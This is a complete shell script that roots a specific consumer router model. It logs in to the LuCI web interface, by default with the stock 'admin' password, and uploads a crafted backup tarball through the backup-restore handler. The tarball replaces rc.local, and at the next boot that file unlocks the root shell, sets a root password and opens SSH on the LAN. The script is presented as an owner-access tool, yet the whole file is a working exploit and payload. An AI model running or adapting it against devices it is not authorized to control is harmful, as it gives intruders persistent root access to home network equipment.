#!/bin/sh
# webadmin-to-root.sh — bootstrap a root SSH shell on an Essentiel B WR1819M
# (or ALFA AX1800RM) from nothing but the web admin password.
#
# Exploits the unauthenticated tar extraction in the LuCI backup-restore
# handler (see docs/08-web-to-root-exploit.md).
#
# Usage:
#   ./webadmin-to-root.sh [ROUTER_IP] [ADMIN_PASSWORD] [ROOT_PASSWORD]
#
# Defaults:
#   ROUTER_IP      = 192.168.1.100
#   ADMIN_PASSWORD = admin   (stock default)
#   ROOT_PASSWORD  = (generated randomly if not provided)
#
# Requirements: curl, tar, mktemp, openssl (for password generation)
# Runs on: Linux, macOS, WSL, Git Bash on Windows

set -e

ROUTER="${1:-192.168.1.100}"
ADMIN_PASS="${2:-admin}"
ROOT_PASS="${3:-}"

if [ -z "$ROOT_PASS" ]; then
    if command -v openssl >/dev/null 2>&1; then
        ROOT_PASS=$(openssl rand -base64 12)
    else
        printf "Error: no root password provided and openssl not available to generate one.\n" >&2
        printf "Usage: %s [router_ip] [admin_password] [root_password]\n" "$0" >&2
        exit 1
    fi
fi

TMPDIR=$(mktemp -d)
trap 'rm -rf "$TMPDIR"' EXIT

printf "=== webadmin-to-root for WR1819M / AX1800RM ===\n"
printf "Router:         %s\n" "$ROUTER"
printf "Admin password: %s\n" "$ADMIN_PASS"
printf "Root password:  %s\n" "$ROOT_PASS"
printf "\n"

# --- Step 1: build the payload tarball ---

printf "[1/4] Building payload...\n"

mkdir -p "$TMPDIR/payload/etc"
cat > "$TMPDIR/payload/etc/rc.local" <<RCEOF
#!/bin/sh
# One-shot owner-access bootstrap. Runs once at next boot as root,
# then restores the stock rc.local so it doesn't loop.
NEWPASS='$ROOT_PASS'

# Unlock root shell (stock firmware sets it to /bin/false)
sed -i 's|^\(root:[^:]*:[^:]*:[^:]*:[^:]*:[^:]*:\)/bin/false|\1/bin/ash|' /etc/passwd

# Set root password
printf '%s\n%s\n' "\$NEWPASS" "\$NEWPASS" | passwd root >/dev/null 2>&1

# Ensure dropbear (SSH) listens on LAN
uci set dropbear.@dropbear[0].PasswordAuth='on'
uci set dropbear.@dropbear[0].Interface='lan'
uci commit dropbear
/etc/init.d/dropbear restart

# Restore stock rc.local to avoid re-running
cp /rom/etc/rc.local /etc/rc.local
sync
exit 0
RCEOF
chmod +x "$TMPDIR/payload/etc/rc.local"

tar czf "$TMPDIR/payload.tar.gz" -C "$TMPDIR/payload" etc

# --- Step 2: authenticate to LuCI ---

printf "[2/4] Logging in to web UI at http://%s ...\n" "$ROUTER"

COOKIE_JAR="$TMPDIR/cookies"

HTTP_CODE=$(curl -s -o "$TMPDIR/login_resp" -w "%{http_code}" \
    -c "$COOKIE_JAR" \
    -d "luci_username=admin&luci_password=$ADMIN_PASS" \
    "http://$ROUTER/cgi-bin/luci/")

if [ "$HTTP_CODE" -lt 200 ] || [ "$HTTP_CODE" -ge 400 ]; then
    printf "Error: login failed (HTTP %s). Check the admin password.\n" "$HTTP_CODE" >&2
    exit 1
fi

if ! grep -q sysauth "$COOKIE_JAR" 2>/dev/null; then
    printf "Error: no sysauth cookie received. Wrong password or unexpected firmware.\n" >&2
    exit 1
fi

printf "    Login OK (sysauth cookie acquired).\n"

# --- Step 3: upload the payload via backup-restore ---

printf "[3/4] Uploading payload via backup-restore endpoint...\n"

RESTORE_RESP=$(curl -s -b "$COOKIE_JAR" \
    -F "archive=@$TMPDIR/payload.tar.gz" \
    "http://$ROUTER/cgi-bin/luci/admin/system/backup/restore")

if echo "$RESTORE_RESP" | grep -q '"reboot"'; then
    printf "    Upload accepted — router is rebooting.\n"
else
    printf "Warning: unexpected response: %s\n" "$RESTORE_RESP" >&2
    printf "The payload may not have been applied. Check manually.\n" >&2
    exit 1
fi

# --- Step 4: wait for reboot and test SSH ---

printf "[4/4] Waiting for reboot (~90 seconds)...\n"

sleep 90

ATTEMPTS=0
MAX_ATTEMPTS=12
while [ "$ATTEMPTS" -lt "$MAX_ATTEMPTS" ]; do
    if curl -s --connect-timeout 3 "http://$ROUTER/" >/dev/null 2>&1; then
        printf "\n=== Router is back online ===\n"
        printf "\nConnect with:\n"
        printf "  ssh root@%s\n" "$ROUTER"
        printf "  Password: %s\n" "$ROOT_PASS"
        printf "\nSave this password — the bootstrap script has already self-deleted\n"
        printf "from rc.local, so re-running this script would overwrite your password.\n"
        exit 0
    fi
    ATTEMPTS=$((ATTEMPTS + 1))
    printf "."
    sleep 10
done

printf "\nRouter did not come back within %d seconds.\n" "$((90 + MAX_ATTEMPTS * 10))" >&2
printf "This is normal if the router takes longer to boot. Try:\n" >&2
printf "  ssh root@%s   (password: %s)\n" "$ROUTER" "$ROOT_PASS" >&2
exit 1
